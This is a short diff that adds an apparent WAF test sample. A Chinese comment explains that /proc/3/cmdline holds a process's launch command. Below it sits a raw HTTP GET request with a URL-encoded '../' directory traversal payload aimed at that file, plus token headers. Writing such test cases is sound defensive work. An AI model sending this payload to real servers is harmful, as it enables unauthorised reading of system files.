@@ -1,0 +1,9 @@
+# 目录遍历_/proc/3/cmdline
+# cmdline文件存储着启动进程的完整命令，可以通过读取这个文件来获取进程的命令行参数
+GET /?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2F3%2Fcmdline&bid=hd_tag_m8mv23sh HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23sh
+RM-PRO-Token: 90d7c7cc2d96aaf02b269f921bec8b08
+RM-PRO-Time: 1742808342123
+User-Agent: curl/7.83.1
+
